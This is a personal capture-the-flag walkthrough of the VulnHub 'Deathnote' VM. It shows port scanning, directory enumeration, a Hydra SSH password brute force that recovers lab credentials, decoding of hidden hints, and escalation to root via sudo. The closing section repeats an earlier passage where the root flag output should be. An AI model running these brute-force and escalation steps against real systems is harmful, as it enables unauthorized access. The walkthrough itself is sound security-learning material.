# Deathnote VulnHub CTF

Netdiscover new VM to get IP address - 10.0.2.11 for me
Then, use sudo nmap -sCV 10.0.2.11 to get open ports. 

Ports 22 and 80 are open... time to go to Firefox and type in http://10.0.2.11, which resolves to deathnote.vuln/wordpress

The site hints that there is a notes.txt file on the server.
So I decided to run a gobuster on http://10.0.2.11 
Gobuster dir -u http://10.0.2.11 -w /usr/share/wordlists/dirb/common.txt

Results show a robots.txt file, so I checked it out and got a message saying
fuck it, my dad
added a hint on /important.jpg
ryuk please delete it

I Decided to check it out by using curl http://deathnote.vuln/important.jpg and got this message:
I am Soichiro Yagami, light's father
i have a doubt if L is true about the assumption that light is kira

i can only help you by giving something important

login username: user.txt
i don't know the password.
find it by yourself
but i think it is in the hint section of site


So we know there is a user.txt and a notes.txt somewhere, so I decided to try and use Nikto this time
nikto -h deathnote.vuln

NIkto reveals a content/uploads folder, sounds like a juicy spot to check, so i added the wordpress/wp-content/uploads/ and found the jackpot!
Under 2021 > 07/there's a few files, namely our notes and user txt files
Notes.txt looks like passwords
User.txt looks like usernames

Maybe use something like Hydra again to brute-force our way in, BUT first we need to download the notes and user txt files using wget to create our wordlis>
wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/notes.txt
wget http://deathnote.vuln/wordpress/wp-content/uploads/2021/07/user.txt

Got the files! NOW to use Hydra to create wordlists and brute-force the combination

hydra -L user.txt -P notes.txt deathnote.vuln ssh

this part took a bit, so bio break and hydrate...

GOT IT!
STATUS] 280.00 tries/min, 280 tries in 00:01h, 453 to do in 00:02h, 14 active
[22][ssh] host: deathnote.vuln   login: l   password: death4me

Now to ssh into the machine using ssh l@10.0.2.11 password is death4me
First thing I did was ls to see files and got a user.txt

Cat, head, and tails all show what looks like gibberish when viewing the file

user.txt
l@deathnote:~$ cat user.txt
++++++++++[>+>+++>+++++++>++++++++++<<<<-]>>>>+++++.<<++.>>+++++++++++.------------.+.+++++.---.<<.>>++++++++++.<<.>>--------------.++++++++.+++++.<<.>>.->


wtf??? had to google it, this is what I got:
The text you provided is encoded in Brainfuck, an esoteric programming language designed to be deliberately difficult for humans to read.
When executed through a Brainfuck interpreter, the string outputs the following hidden message:
i think u got the shell , but you wont be able to kill me -kira

what? lol

After some blood, sweat, and tears, I found the next step, Navigate to cd /opt > L to see two directories:

fake-notebook-rule - cd into this and you see a .wav file and a hint file, the hint says use cyberchef

kira_case - inside is a case file which says this:
The FBI agent died on December 27, 2006
1 week after the investigation of the task-force member/head.
aka.....
Soichiro Yagami's family.
hmmmmmmmmm......
and according to watari ,
he died as other died after Kira targeted them .
and we also found something in
fake-notebook-rule folder .

case.wav gives us this:
l@deathnote:/opt/L/fake-notebook-rule$ cat case.wav
63 47 46 7a 63 33 64 6b 49 44 6f 67 61 32 6c 79 59 57 6c 7a 5a 58 5a 70 62 43 41 3d
which we know from the hint to use CyberChef
that gives me this : passwd:kiraisevil

Well, the story goes deep, I guess.....
Anyway, I went back to the home directory and hit ls, I see there are two directories. Kira and L, we are already in L, so let's try kira.

l@deathnote:/$ cd /home
l@deathnote:/home$ ls
kira  l
l@deathnote:/home$ cd kira
l@deathnote:/home/kira$ ls
kira.txt
l@deathnote:/home/kira$ cat kira.txt
cat: kira.txt: Permission denied

Well then, permission denied.... let's try to su in as Kira now

kira@deathnote:~$ cat kira.txt
cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp
kira@deathnote:~$

not this again... time for cyberchef again i guess

Not going to lie, had to Google it, CyberChef wasn't giving me anything

Here's what I found out I have to do:
echo "cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp" | base64 — decode

gives you this:
kira@deathnote:~$ echo "cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp"|base64  --decode
Please protect one of the following
1. L (/opt)
2. Misa (/var)kira@deathnote:

We did /opt already, so we selected the /var by using cd /var
kira@deathnote:~$ cd /var
kira@deathnote:/var$ ls
backups  cache  lib  local  lock  log  mail  misa  opt  run  spool  tmp  www
kira@deathnote:/var$ cat misa
it is toooo late for misa
kira@deathnote:/var$ sudo -l
[sudo] password for kira:
Sorry, try again.
[sudo] password for kira:
Matching Defaults entries for kira on deathnote:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User kira may run the following commands on deathnote:
    (ALL : ALL) ALL

Looks like Kira is root and has all permissions

Time to elevate permissions to root!
kira@deathnote:/var$ sudo su

oot@deathnote:/var# cd
root@deathnote:~#

root@deathnote:~# ls
root.txt
root@deathnote:~# cat root.txt

not going to lie had to google it, cyberchef wasnt giving me anything
echo "cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp" | base64 — decode

gives you this:
kira@deathnote:~$ echo "cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp"|base64  --decode
please protect one of the following
